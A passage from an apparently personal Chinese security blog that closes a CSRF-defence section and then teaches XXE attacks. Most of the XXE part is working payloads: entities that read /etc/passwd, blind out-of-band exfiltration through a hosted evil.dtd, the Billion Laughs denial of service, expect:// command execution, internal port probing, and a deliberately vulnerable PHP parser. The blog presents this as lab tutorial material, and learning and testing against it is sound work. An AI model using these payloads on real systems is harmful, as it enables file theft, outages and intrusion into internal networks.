<p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <a target="_blank" rel="noopener" href="http://url?csrftoken=tokenvalue。">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上<br>”tokenvalue”/<br>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。另外还有一个问题就是怎么保障token本身的存储安全，不要被黑客截获。</p>
<p>验证token方式总结</p>
<p>安全程度比Referer的方式要高；<br>实现方式上稍微复杂；<br>需要保证token存储的安全性。</p>
<ol>
<li>在 HTTP 头中自定义属性并验证<br>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</li>
</ol>
<p>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<p>验证Head属性方式总结</p>
<p>使用方式较简单，而且token不容易泄露<br>使用场合较少，局限性较大。</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252963.html">https://www.freebuf.com/articles/web/252963.html</a></p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE带来的危害"><a href="#XXE带来的危害" class="headerlink" title="XXE带来的危害"></a>XXE带来的危害</h3><p>　　利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p>
<p>　　当我们了解清楚以上的信息后，我们就能理解如何构造外部实体注入攻击与它的危害性了。</p>
<p>如何构造外部实体注入攻击<br>　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
<p>　　有回显的payload写法：</p>
<p>直接通过DTD外部实体声明。XML内容如下：</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt;
    &lt;!DOCTYPE ANY [
            &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
    ]&gt;
    &lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre><p>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt;
    &lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
    &lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre><p>evil.dtd内容：</p>
<pre><code>    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre><p>通过DTD外部实体声明引入外部实体声明。XML内容如下:</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt;
    &lt;!DOCTYPE a [
            &lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
    %d;
    ]&gt;
    &lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre><p>evil.dtd内容：</p>
<pre><code>    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre><p>但是如果想通过如下声明是不可以的：</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt; 
    &lt;!DOCTYPE a [
    &lt;!ENTITY d SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
    ]&gt;
    &lt;abc&gt;&amp;d;&lt;/abc&gt;
</code></pre><p>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。</p>
<p>　　无回显的payload写法：</p>
<p>第一种无回显示payload写法：</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt; 
    &lt;!DOCTYPE a [
    &lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; 
    %dtd; %all; 
    ]&gt; 
    &lt;abc&gt;&amp;send;&lt;/abc&gt;
</code></pre><p>其中evil.xml文件内容为</p>
<pre><code>     &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://localhost%file;&#39;&gt;&quot;&gt;
</code></pre><p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</p>
<p>第二种无回显payload写法：</p>
<pre><code>    &lt;?xml version=&quot;1.0&quot;?&gt;
    &lt;!DOCTYPE a [
    &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
    %dtd;
    %send;
    ]&gt;
    &lt;abc&gt;&lt;/abc&gt;
</code></pre><p>其中evil.xml文件内容为：</p>
<pre><code>    &lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;
</code></pre><p>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<p>　　这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的        internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</p>
<p>　　一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析。</p>
<p>　　首先准备一个有XXE漏洞的文件，本次测试以php为主：</p>
<pre><code>&lt;?php
$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]);
echo &quot;&lt;pre&gt;&quot; ;
print_r($xml);//注释掉该语句即为无回显的情况
?&gt;
</code></pre><p>危害1.读取任意文件</p>
<p>有回显情况:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre><p>image.png</p>
<h4 id="无回显情况"><a href="#无回显情况" class="headerlink" title="无回显情况:"></a>无回显情况:</h4><p>　　本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre><p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;
</code></pre><p>image.png</p>
<p>YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==Base64解码即可。</p>
<p>　　通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>危害2.拒绝服务攻击</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre><p>　　此示例就是著名的Billion laughs attack该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DoS 攻击。</p>
<p>　　原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
<p>危害3.远程命令(代码)执行</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre><p>　　此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
<p>危害4.内网信息探测</p>
<p>　　利用http协议<a target="_blank" rel="noopener" href="http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。">http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</a></p>
<p>有回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre><p>当端口开放时，如80端口：<br>image.png</p>
<p>当端口未开放时，如81端口:image.png</p>
<p>无回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:81/&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre><p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;
</code></pre><p>　　观察日志文件即可。</p>
<p>当端口开放时，如80端口:image.png当端口未开放时，如81端口:image.png</p>
<p>　　有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。</p>
<p>危害5.攻击内网网站</p>
<p>难得搭建环境，就直接引用网上的例子吧：</p>
<p>image.png</p>
<p>这个示例是攻击内网strusts2网站，远程执行系统命令。</p>
<p>还可部署bash文件建立监听，获得反弹shellcode等。</p>
<p>由于xml实体注入攻击可以利用<a target="_blank" rel="noopener" href="http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。">http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41652128/article/details/88733041">https://blog.csdn.net/weixin_41652128/article/details/88733041</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">q0o0p</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/">https://github.com/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/2020/10/15/re/undefined" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/08/badusb/"><img class="prev-cover" src="/2020/11/08/badusb/undefined" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">badusb</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/15/ree/"><img class="next-cover" src="/2020/10/15/ree/undefined" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">owasp top10</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">q0o0p</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">84</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">21</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" href="https://github.com/q0o0p-wow/q0o0p-wow.github.io"><i class="q0o0p"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">网站渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">第一类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">第二类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">Sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">sql注入检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8A%A0%E5%85%A5%E5%8D%95%E5%BC%95%E5%8F%B7-%E2%80%99%E6%8F%90%E4%BA%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.加入单引号 ’提交,</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.数字型判断是否有注入;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.1.3.</span> <span class="toc-text">3.字符型判断是否有注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%90%9C%E7%B4%A2%E5%9E%8B%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.4.</span> <span class="toc-text">4.搜索型判断是否有注入:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E6%94%AF%E6%8C%815%E7%A7%8D%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">sqlmap支持5种注入模式：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%AD%A5%E9%AA%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">常见步骤如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.</span> <span class="toc-text">sql注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">2.2.3.</span> <span class="toc-text">sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf-%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">waf 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">3.1.</span> <span class="toc-text">xss 跨站脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%9A"><span class="toc-number">3.1.1.</span> <span class="toc-text">存储型XSS：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9A"><span class="toc-number">3.1.2.</span> <span class="toc-text">反射型XSS：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS%EF%BC%9A"><span class="toc-number">3.1.3.</span> <span class="toc-text">DOM型XSS：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%BD%9C%E4%B8%BAHTML%E6%B3%A8%E9%87%8A%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%BD%9C%E4%B8%BA%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%90%8D%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%BD%9C%E4%B8%BA%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%BD%9C%E4%B8%BA%E6%A0%87%E7%AD%BE%E5%90%8D%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">用户输入作为标签名，导致攻击者可以进行闭合绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%BD%9C%E4%B8%BACSS%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">8.0.1.</span> <span class="toc-text">XSS漏洞的危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E2%80%9C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E2%80%9D"><span class="toc-number">8.1.</span> <span class="toc-text">CSRF “跨站请求伪造”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">8.1.1.</span> <span class="toc-text">CSRF漏洞测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E9%98%B2CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">8.1.2.</span> <span class="toc-text">预防CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.2.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">8.3.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">8.3.1.</span> <span class="toc-text">XXE带来的危害</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%83%85%E5%86%B5"><span class="toc-number">8.3.1.1.</span> <span class="toc-text">无回显情况:</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/Book-Noise/" title="噪声"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="噪声"/></a><div class="content"><a class="title" href="/2026/01/12/Book-Noise/" title="噪声">噪声</a><time datetime="2026-01-12T13:28:03.000Z" title="Created 2026-01-12 21:28:03">2026-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/quant-trad-introduction/" title="quant_trad_introduction"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="quant_trad_introduction"/></a><div class="content"><a class="title" href="/2026/01/12/quant-trad-introduction/" title="quant_trad_introduction">quant_trad_introduction</a><time datetime="2026-01-12T13:28:03.000Z" title="Created 2026-01-12 21:28:03">2026-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/18/tensorflow/" title="tensorflow 初使用"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tensorflow 初使用"/></a><div class="content"><a class="title" href="/2022/11/18/tensorflow/" title="tensorflow 初使用">tensorflow 初使用</a><time datetime="2022-11-18T06:12:52.000Z" title="Created 2022-11-18 14:12:52">2022-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/14/smart-television/" title="smart-television"><img src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="smart-television"/></a><div class="content"><a class="title" href="/2022/10/14/smart-television/" title="smart-television">smart-television</a><time datetime="2022-10-14T07:31:32.000Z" title="Created 2022-10-14 15:31:32">2022-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/14/IoT-hardware/" title="IoT-hardware"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IoT-hardware"/></a><div class="content"><a class="title" href="/2022/10/14/IoT-hardware/" title="IoT-hardware">IoT-hardware</a><time datetime="2022-10-14T06:56:40.000Z" title="Created 2022-10-14 14:56:40">2022-10-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/2020/10/15/re/undefined')"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2026 By q0o0p</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      true && mermaid.init()
    })
  }
}</script></div><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script>
- <script src="https://cdn.jsdelivr.net/gh/Akilarlxh/live2d_demo_without_api@v1.1/assets/jquery.min.js"></script> - <script defer src="https://cdn.jsdelivr.net/gh/Akilarlxh/live2d_demo_without_api@v1.1/assets/jquery-ui.min.js"></script> - <script defer data-pjax src="https://cdn.jsdelivr.net/gh/Akilarlxh/live2d_demo_without_api@v1.1/assets/autoload.js"></script>
<script src="/js/snow_small.js"></script> <script src="/js/fish.js"></script>
